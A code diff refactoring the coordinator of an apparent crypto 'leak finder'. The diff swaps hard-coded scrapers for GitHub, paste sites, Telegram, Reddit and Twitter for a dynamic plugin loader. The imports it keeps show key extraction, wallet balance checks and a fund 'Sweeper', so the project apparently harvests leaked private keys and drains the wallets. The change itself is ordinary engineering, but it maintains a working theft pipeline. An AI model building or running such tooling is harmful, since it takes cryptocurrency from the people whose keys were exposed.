@@ -1,8 +1,10 @@
 """Leak finder coordinator."""
 from __future__ import annotations
 import asyncio
+import importlib
 import logging
 import os
+import pathlib
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
 from typing import Optional
@@ -13,12 +15,7 @@ from src.modules.crypto.balance.multicall import batch_check_balances, batch_che
 from src.modules.crypto.balance.sweeper import Sweeper, SweepResult
 from src.modules.crypto.balance.scanner_coordinator import ScannerCoordinator
 from src.modules.crypto.leak_finder.extractor import ExtractedKey, extract_keys
-from src.modules.crypto.leak_finder.sources.github_source import GitHubLeakSource, RawLeak
-from src.modules.crypto.leak_finder.sources.paste_source import PasteSource
-from src.modules.crypto.leak_finder.sources.telegram_source import TelegramSource
-from src.modules.crypto.leak_finder.sources.tgstat_source import TGStatSource
-from src.modules.crypto.leak_finder.sources.reddit_source import RedditSource
-from src.modules.crypto.leak_finder.sources.twitter_source import TwitterSource
+from src.modules.crypto.leak_finder.sources.github_source import RawLeak
 
 logger = logging.getLogger(__name__)
 
@@ -37,7 +34,41 @@ class LeakFinderResult:
     def elapsed_seconds(self) -> float:
         return (self.completed_at - self.started_at).total_seconds() if self.completed_at else 0.0
 
-_SOURCE_MAP: dict[str, type] = {"github": GitHubLeakSource, "paste": PasteSource, "telegram": TelegramSource, "tgstat": TGStatSource, "reddit": RedditSource, "twitter": TwitterSource}
+
+def _discover_sources() -> dict[str, type]:
+    """Auto-discover source classes from the sources directory.
+
+    Scans for *_source.py files, imports each module, and finds the class
+    that ends with 'Source'. This way adding a new source = just dropping
+    a file in sources/ — no coordinator modification needed.
+    """
+    source_map: dict[str, type] = {}
+    sources_dir = pathlib.Path(__file__).parent / "sources"
+    for py_file in sorted(sources_dir.glob("*_source.py")):
+        module_name = py_file.stem  # e.g. "github_source"
+        # Derive the source key: "github_source" -> "github"
+        key = module_name.replace("_source", "")
+        try:
+            module = importlib.import_module(
+                f"src.modules.crypto.leak_finder.sources.{module_name}"
+            )
+            # Find the class ending with "Source"
+            for attr_name in dir(module):
+                attr = getattr(module, attr_name)
+                if (
+                    isinstance(attr, type)
+                    and attr_name.endswith("Source")
+                    and attr_name != "RawLeak"
+                    and hasattr(attr, "fetch_raw_leaks")
+                ):
+                    source_map[key] = attr
+                    break
+        except Exception as exc:
+            logger.debug("Failed to auto-discover source %s: %s", module_name, exc)
+    return source_map
+
+
+_SOURCE_MAP = _discover_sources()
 ALL_SOURCES = list(_SOURCE_MAP.keys())
 
 class LeakFinderCoordinator:
@@ -129,19 +160,13 @@ class LeakFinderCoordinator:
             await asyncio.sleep(interval_sec)
 
     def _create_source(self, name: str):
+        cls = _SOURCE_MAP.get(name)
+        if cls is None:
+            return None
+        # GitHub source needs the token
         if name == "github":
-            return GitHubLeakSource(github_token=self._github_token)
-        elif name == "paste":
-            return PasteSource()
-        elif name == "telegram":
-            return TelegramSource()
-        elif name == "tgstat":
-            return TGStatSource()
-        elif name == "reddit":
-            return RedditSource()
-        elif name == "twitter":
-            return TwitterSource()
-        return None
+            return cls(github_token=self._github_token)
+        return cls()
 
     async def _fetch_all_sources(self) -> list[RawLeak]:
         tasks = []
